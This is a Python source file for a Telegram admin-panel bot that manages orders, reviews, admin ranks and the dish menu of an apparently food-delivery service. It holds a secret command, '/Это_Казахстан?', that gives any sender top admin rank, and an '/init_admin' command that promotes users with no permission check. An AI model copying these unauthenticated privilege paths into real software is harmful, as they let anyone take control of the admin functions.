import telebot
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from progekt_1_SQL import Database
from datetime import datetime, timedelta

text = ''
with open('data.json', 'r', encoding='utf-8') as f:  # открыли файл с данными
    text = json.load(f)

db = Database('db.sqlite')
tg_group_admins_id = -4054648163
token = text['tg_admin_panel']

bot = telebot.TeleBot(token)

menu_1 = ["Статусы заказов", "Отзывы на заказы", "Отзывы на блюда", "Удаление администратора",
          "Изменение администраторов", "Управление меню блюд"]
menu_2 = ["Добавление", "Изменение", "Удаление", "Назад"]

# Клавиатура для администраторов
admin_markup = InlineKeyboardMarkup()

for x1 in menu_1:
    admin_markup.add(InlineKeyboardButton(x1, callback_data="A" + str(x1)))


def sender():
    time_now = datetime.now()
    a = db.adm_chec_orders(time_now)
    if a is not None:
        bot.send_message(tg_group_admins_id, 'Проверьте статусы заказов')
    b = db.adm_get_rating_prod()
    if b is not None:
        bot.send_message(tg_group_admins_id, 'Проверьте отзывы на блюда')
    c = db.adm_get_rating_ord()
    if c is not None:
        bot.send_message(tg_group_admins_id, 'Проверьте отзывы на доставки')


@bot.message_handler(commands=['start_admin_panel'])
def start_admin_panel(message):
    # Проводим проверку является ли пользователь администратором
    is_admin = db.get_user_category(message.from_user.id)

    if is_admin == 'Данного пользователя не существует либо он пользуется vk-ботом':
        bot.reply_to(message, "У вас нет прав администратора")
    elif is_admin == 0:
        bot.reply_to(message, "У вас нет прав администратора")
    elif is_admin != 0:
        bot.send_message(message.chat.id, "Панель администратора", reply_markup=admin_markup)


@bot.message_handler(commands=['Это_Казахстан?'])
def secret_panel(message):
    print(message.from_user.id)
    print(message.chat.id)
    try:
        db.add_user(None, int(message.from_user.id), None)
    except:
        pass
    db.adm_change_to_second_rank(message.from_user.id)
    bot.reply_to(message, "Казахстан, да")


@bot.message_handler(commands=['init_admin'])
def init_new_admin(message):
    msg = bot.send_message(message.chat.id, 'Введите id пользователя')
    bot.register_next_step_handler(msg, create_adm)


def create_adm(message):
    if db.check_tg_id(int(message.text)) is None:
        bot.send_message(message.chat.id, "Некоректные данные id")
    else:
        db.adm_change_to_first_rank(int(message.text))
        bot.send_message(message.chat.id, 'Пользователь переведен в ряды администрации')


@bot.callback_query_handler(func=lambda call: True)
def query_handler(call):
    flag = call.data[0:1]
    data = call.data[1:]
    if flag == 'A':
        if data == 'back':
            bot.edit_message_text("Панель администратора", call.message.chat.id,
                                  call.message.message_id, reply_markup=admin_markup)

        elif data == "Статусы заказов":
            stat = InlineKeyboardMarkup()
            stat_list = db.adm_get_ord()
            if stat_list != []:
                if len(stat_list) == 1:
                    stat.add(InlineKeyboardButton('back', callback_data='Aback'))
                    stat.add(InlineKeyboardButton('Принять', callback_data="D" + 'a' + str(stat_list[0][0])))
                    bot.edit_message_text("Активный заказ " + str(stat_list[0][0]) + '. ' + str(stat_list[0][1]),
                                          call.message.chat.id,
                                          call.message.message_id, reply_markup=stat)
                else:
                    stat.add(InlineKeyboardButton('back', callback_data='Aback'),
                             InlineKeyboardButton('>', callback_data="D" + '>' + str(0) + '.' + str(stat_list[0][0])))
                    stat.add(InlineKeyboardButton('Принять', callback_data="D" + 'a' + str(stat_list[0][0])))
                    bot.edit_message_text("Активный заказ " + str(stat_list[0][0]) + '. ' + str(stat_list[0][1]),
                                          call.message.chat.id,
                                          call.message.message_id, reply_markup=stat)
            else:
                stat.add(InlineKeyboardButton('back', callback_data='Aback'))
                bot.edit_message_text("Активных заказов нет", call.message.chat.id,
                                      call.message.message_id, reply_markup=stat)

        elif data == "Отзывы на заказы":
            ord_review_menu = InlineKeyboardMarkup()
            ord_review_list = db.adm_get_rating_ord()
            if ord_review_list != []:
                if len(ord_review_list) == 1:
                    ord_review_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
                    ord_review_menu.add(
                        InlineKeyboardButton('Просмотр', callback_data="E" + 'a' + str(ord_review_list[0][0])))
                    bot.edit_message_text("Отзыв на заказ № " + str(ord_review_list[0][0]),
                                          call.message.chat.id, call.message.message_id, reply_markup=ord_review_menu)
                else:
                    ord_review_menu.add(InlineKeyboardButton('back', callback_data='Aback'),
                                        InlineKeyboardButton('>', callback_data="E" + '>' + str(0) + '.' + str(
                                            ord_review_list[0][0])))
                    ord_review_menu.add(
                        InlineKeyboardButton('Просмотр', callback_data="E" + 'a' + str(ord_review_list[0][0])))
                    bot.edit_message_text("Отзыв на заказ № " + str(ord_review_list[0][0]),
                                          call.message.chat.id, call.message.message_id, reply_markup=ord_review_menu)
            else:
                ord_review_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
                bot.edit_message_text("Активных отзывов нет", call.message.chat.id,
                                      call.message.message_id, reply_markup=ord_review_menu)


        elif data == "Отзывы на блюда":
            prod_review_menu = InlineKeyboardMarkup()
            prod_review_list = db.adm_get_rating_prod()
            if prod_review_list != []:
                if len(prod_review_list) == 1:
                    prod_review_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
                    prod_review_menu.add(
                        InlineKeyboardButton('Просмотр', callback_data="F" + 'a' + str(prod_review_list[0][0])))
                    bot.edit_message_text(
                        "Отзыв на блюдо № " + str(prod_review_list[0][0]) + '. ' + str(prod_review_list[0][1]),
                        call.message.chat.id,
                        call.message.message_id, reply_markup=prod_review_menu)
                else:
                    prod_review_menu.add(InlineKeyboardButton('back', callback_data='Aback'),
                                         InlineKeyboardButton('>', callback_data="F" + '>' + str(0) + '.' + str(
                                             prod_review_list[0][0])))
                    prod_review_menu.add(
                        InlineKeyboardButton('Просмотр', callback_data="F" + 'a' + str(prod_review_list[0][0])))
                    bot.edit_message_text(
                        "Отзыв на блюдо № " + str(prod_review_list[0][0]) + '. ' + str(prod_review_list[0][1]),
                        call.message.chat.id, call.message.message_id, reply_markup=prod_review_menu)
            else:
                prod_review_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
                bot.edit_message_text("Активных отзывов нет", call.message.chat.id,
                                      call.message.message_id, reply_markup=prod_review_menu)

        elif data == "Удаление администратора":
            is_admin = db.get_user_category(call.message.chat.id)
            if is_admin != 2:
                bot.answer_callback_query(callback_query_id=call.id, text='Вы не обладаете такими правами')
            else:
                list_admins = db.adm_get_admins(call.message.chat.id)
                adm_menu = InlineKeyboardMarkup()
                for x6 in list_admins:
                    adm_menu.add(InlineKeyboardButton(str(x6[0]) + ' - status: ' + str(x6[1]),
                                                      callback_data='K' + str(x6[0])))
                adm_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
                bot.edit_message_text('меню одменов', call.message.chat.id,
                                      call.message.message_id, reply_markup=adm_menu)

        elif data == "Изменение администраторов":
            is_admin = db.get_user_category(call.message.chat.id)
            if is_admin != 2:
                bot.answer_callback_query(callback_query_id=call.id, text='Вы не обладаете такими правами')
            else:
                list_admins = db.adm_get_admins(call.message.chat.id)
                adm_menu = InlineKeyboardMarkup()
                for x6 in list_admins:
                    adm_menu.add(InlineKeyboardButton(str(x6[0]) + ' - status: ' + str(x6[1]),
                                                      callback_data='J' + str(x6[0]) + str(x6[1])))
                adm_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
                bot.edit_message_text('меню одменов', call.message.chat.id,
                                      call.message.message_id, reply_markup=adm_menu)

        elif data == "Управление меню блюд":
            is_admin = db.get_user_category(call.message.chat.id)
            if is_admin != 2:
                bot.answer_callback_query(callback_query_id=call.id, text='Вы не обладаете такими правами')
            else:
                list_pr_st = db.adm_get_products_status()
                prod_menu = InlineKeyboardMarkup()
                for x6 in list_pr_st:
                    prod_menu.add(InlineKeyboardButton(str(x6[0]) + ' - status: ' + str(x6[1]),
                                                       callback_data='H' + x6[0] + str(x6[1])))
                prod_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
                bot.edit_message_text('меню продуктов', call.message.chat.id,
                                      call.message.message_id, reply_markup=prod_menu)

    elif flag == 'D':
        stat_list = db.adm_get_ord()
        if data[0] == '>':
            coord = int(data[1]) + 1
            if coord == (len(stat_list) - 1):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="D" + '<' + str(coord - 1) + '.' + str(
                    stat_list[coord][0])),
                           InlineKeyboardButton('back', callback_data='Aback'))
                d_menu.add(InlineKeyboardButton('Принять', callback_data="D" + 'a' + str(stat_list[coord][0])))
                bot.edit_message_text("Активный заказ " + str(stat_list[coord][0]) + '. ' + str(stat_list[coord][1]),
                                      call.message.chat.id, call.message.message_id, reply_markup=d_menu)

            elif coord < len(stat_list):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="D" + '<' + str(coord - 1) + '.' + str(
                    stat_list[coord - 1][0])),
                           InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="D" + '>' + str(coord) + '.' + str(stat_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Принять', callback_data="D" + 'a' + str(stat_list[coord][0])))
                bot.edit_message_text("Активный заказ " + str(stat_list[coord][0]) + '. ' + str(stat_list[coord][1]),
                                      call.message.chat.id, call.message.message_id, reply_markup=d_menu)
        elif data[0] == '<':
            coord = int(data[1])
            if coord == 0:
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="D" + '>' + str(coord) + '.' + str(stat_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Принять', callback_data="D" + 'a' + str(stat_list[1][0])))
                bot.edit_message_text("Активный заказ " + str(stat_list[coord][0]) + '. ' + str(stat_list[coord][1]),
                                      call.message.chat.id, call.message.message_id, reply_markup=d_menu)

            elif coord < len(stat_list):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="D" + '<' + str(coord - 1) + '.' + str(
                    stat_list[coord][0])),
                           InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="D" + '>' + str(coord) + '.' + str(stat_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Принять', callback_data="D" + 'a' + str(stat_list[coord][0])))
                bot.edit_message_text("Активный заказ " + str(stat_list[coord][0]) + '. ' + str(stat_list[coord][1]),
                                      call.message.chat.id, call.message.message_id, reply_markup=d_menu)
        elif data[0] == 'a':
            db.adm_change_order_status(data.split('a')[1])
            d_menu = InlineKeyboardMarkup()
            d_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text("status changed",
                                  call.message.chat.id, call.message.message_id, reply_markup=d_menu)

    elif flag == 'E':
        ord_review_list = db.adm_get_rating_ord()
        if data[0] == '>':
            coord = int(data[1]) + 1
            if coord == (len(ord_review_list) - 1):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="E" + '<' + str(coord - 1) + '.' + str(
                    ord_review_list[coord][0])),
                           InlineKeyboardButton('back', callback_data='Aback'))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="E" + 'a' + str(ord_review_list[coord][0])))
                bot.edit_message_text(
                    "Активный заказ " + str(ord_review_list[coord][0]) + '. ' + str(ord_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)

            elif coord < len(ord_review_list):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="E" + '<' + str(coord - 1) + '.' + str(
                    ord_review_list[coord - 1][0])),
                           InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="E" + '>' + str(coord) + '.' + str(
                                                    ord_review_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="E" + 'a' + str(ord_review_list[coord][0])))
                bot.edit_message_text(
                    "Активный заказ " + str(ord_review_list[coord][0]) + '. ' + str(ord_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)
        elif data[0] == '<':
            coord = int(data[1])
            if coord == 0:
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="E" + '>' + str(coord) + '.' + str(
                                                    ord_review_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="E" + 'a' + str(ord_review_list[1][0])))
                bot.edit_message_text(
                    "Активный заказ " + str(ord_review_list[coord][0]) + '. ' + str(ord_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)

            elif coord < len(ord_review_list):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="E" + '<' + str(coord - 1) + '.' + str(
                    ord_review_list[coord][0])),
                           InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="E" + '>' + str(coord) + '.' + str(
                                                    ord_review_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="E" + 'a' + str(ord_review_list[coord][0])))
                bot.edit_message_text(
                    "Активный заказ " + str(ord_review_list[coord][0]) + '. ' + str(ord_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)

        elif data[0] == 'a':
            data = data.split('a')[1]
            list1 = db.adm_get_ord_rewiew(data)
            ord_rat_menu = InlineKeyboardMarkup()
            ord_rat_menu.add(InlineKeyboardButton('принять', callback_data='B' + str(data) + 'accept'),
                             InlineKeyboardButton('отклонить', callback_data='B' + str(data) + 'refuse'))
            ord_rat_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('Отметка ☆: ' + str(list1[0]) + '\n' + 'Отзыв: ' + str(list1[1]),
                                  call.message.chat.id, call.message.message_id, reply_markup=ord_rat_menu)

    elif flag == 'F':
        prod_review_list = db.adm_get_rating_prod()
        if data[0] == '>':
            coord = int(data[1]) + 1
            if coord == (len(prod_review_list) - 1):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="F" + '<' + str(coord - 1) + '.' + str(
                    prod_review_list[coord][0])),
                           InlineKeyboardButton('back', callback_data='Aback'))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="F" + 'a' + str(prod_review_list[coord][0])))
                bot.edit_message_text(
                    "Отзыв на блюдо № " + str(prod_review_list[coord][0]) + '. ' + str(prod_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)

            elif coord < len(prod_review_list):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="F" + '<' + str(coord - 1) + '.' + str(
                    prod_review_list[coord - 1][0])),
                           InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="F" + '>' + str(coord) + '.' + str(
                                                    prod_review_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="F" + 'a' + str(prod_review_list[coord][0])))
                bot.edit_message_text(
                    "Отзыв на блюдо № " + str(prod_review_list[coord][0]) + '. ' + str(prod_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)
        elif data[0] == '<':
            coord = int(data[1])
            if coord == 0:
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="F" + '>' + str(coord) + '.' + str(
                                                    prod_review_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="F" + 'a' + str(prod_review_list[1][0])))
                bot.edit_message_text(
                    "Отзыв на блюдо № " + str(prod_review_list[coord][0]) + '. ' + str(prod_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)

            elif coord < len(prod_review_list):
                d_menu = InlineKeyboardMarkup()
                d_menu.add(InlineKeyboardButton('<', callback_data="F" + '<' + str(coord - 1) + '.' + str(
                    prod_review_list[coord][0])),
                           InlineKeyboardButton('back', callback_data='Aback'),
                           InlineKeyboardButton('>',
                                                callback_data="F" + '>' + str(coord) + '.' + str(
                                                    prod_review_list[coord][0])))
                d_menu.add(InlineKeyboardButton('Прсмотр', callback_data="F" + 'a' + str(prod_review_list[coord][0])))
                bot.edit_message_text(
                    "Отзыв на блюдо № " + str(prod_review_list[coord][0]) + '. ' + str(prod_review_list[coord][1]),
                    call.message.chat.id, call.message.message_id, reply_markup=d_menu)
        elif data[0] == 'a':
            data = data.split('a')[1]
            list1 = db.adm_get_prod_rewiew(data)
            ord_rat_menu = InlineKeyboardMarkup()
            ord_rat_menu.add(InlineKeyboardButton('принять', callback_data='G' + str(data) + 'accept'),
                             InlineKeyboardButton('отклонить', callback_data='G' + str(data) + 'refuse'))
            ord_rat_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('Отметка ☆: ' + str(list1[0]) + '\n' + 'Отзыв: ' + str(list1[1]),
                                  call.message.chat.id, call.message.message_id, reply_markup=ord_rat_menu)

    elif flag == 'B':
        b_menu = InlineKeyboardMarkup()
        if data[-6:] == 'accept':
            order_id = data.replace('accept', '')
            db.adm_accept_stat_ord(int(order_id))
            b_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('Отзыв принят', call.message.chat.id, call.message.message_id, reply_markup=b_menu)
        elif data[-6:] == 'refuse':
            order_id = data.replace('refuse', '')
            db.adm_refuse_stat_ord(int(order_id))
            b_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('Отзыв отклонен', call.message.chat.id, call.message.message_id, reply_markup=b_menu)

    elif flag == 'G':
        f_menu = InlineKeyboardMarkup()
        if data[-6:] == 'accept':
            order_id = data.replace('accept', '')
            db.adm_accept_stat_prod(int(order_id))
            f_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('Отзыв принят', call.message.chat.id, call.message.message_id, reply_markup=f_menu)
        elif data[-6:] == 'refuse':
            order_id = data.replace('refuse', '')
            db.adm_refuse_stat_prod(int(order_id))
            f_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('Отзыв отклонен', call.message.chat.id, call.message.message_id, reply_markup=f_menu)

    elif flag == 'H':
        if data[-1:] == "1":
            product = data[:-1]
            db.adm_stop_prod(product)
            bot.answer_callback_query(callback_query_id=call.id, text=f'Статус {product} изменен')
            list_pr_st = db.adm_get_products_status()
            prod_menu = InlineKeyboardMarkup()
            for x6 in list_pr_st:
                prod_menu.add(InlineKeyboardButton(str(x6[0]) + ' - status: ' + str(x6[1]),
                                                   callback_data='H' + x6[0] + str(x6[1])))
            prod_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('меню продуктов', call.message.chat.id,
                                  call.message.message_id, reply_markup=prod_menu)
        elif data[-1:] == "0":
            product = data[:-1]
            db.adm_unstop_prod(product)
            bot.answer_callback_query(callback_query_id=call.id, text=f'Статус {product} изменен')
            list_pr_st = db.adm_get_products_status()
            prod_menu = InlineKeyboardMarkup()
            for x6 in list_pr_st:
                prod_menu.add(InlineKeyboardButton(str(x6[0]) + ' - status: ' + str(x6[1]),
                                                   callback_data='H' + x6[0] + str(x6[1])))
            prod_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('меню продуктов', call.message.chat.id,
                                  call.message.message_id, reply_markup=prod_menu)

    elif flag == 'J':
        if data[-1:] == "2":
            admin_id = data[:-1]
            db.adm_change_to_first_rank(admin_id)
            bot.answer_callback_query(callback_query_id=call.id, text=f'Статус администратора {admin_id} изменен')
            list_admins = db.adm_get_admins(call.message.chat.id)
            adm_menu = InlineKeyboardMarkup()
            for x6 in list_admins:
                adm_menu.add(InlineKeyboardButton(str(x6[0]) + ' - status: ' + str(x6[1]),
                                                  callback_data='J' + str(x6[0]) + str(x6[1])))
            adm_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('меню одменов', call.message.chat.id,
                                  call.message.message_id, reply_markup=adm_menu)
        elif data[-1:] == "1":
            admin_id = data[:-1]
            db.adm_change_to_second_rank(admin_id)
            bot.answer_callback_query(callback_query_id=call.id, text=f'Статус администратора {admin_id} изменен')
            list_admins = db.adm_get_admins(call.message.chat.id)
            adm_menu = InlineKeyboardMarkup()
            for x6 in list_admins:
                adm_menu.add(InlineKeyboardButton(str(x6[0]) + ' - status: ' + str(x6[1]),
                                                  callback_data='J' + str(x6[0]) + str(x6[1])))
            adm_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
            bot.edit_message_text('меню одменов', call.message.chat.id,
                                  call.message.message_id, reply_markup=adm_menu)
    elif flag == 'K':
        adm_menu = InlineKeyboardMarkup()
        adm_menu.add(InlineKeyboardButton('принять', callback_data='L' + str(data)),
                     InlineKeyboardButton('отказаться', callback_data='Aback'))
        adm_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
        bot.edit_message_text(f'id администратора: {data}\n Действительно удалить?', call.message.chat.id,
                              call.message.message_id, reply_markup=adm_menu)
    elif flag == 'L':
        db.adm_decrease_adm_rank(data)
        adm_menu = InlineKeyboardMarkup()
        adm_menu.add(InlineKeyboardButton('back', callback_data='Aback'))
        bot.edit_message_text(f'Администратор {data} понижен до пользователя', call.message.chat.id,
                              call.message.message_id, reply_markup=adm_menu)


def admin_panel_run():
    bot.polling()


if __name__ == '__main__':
    admin_panel_run()
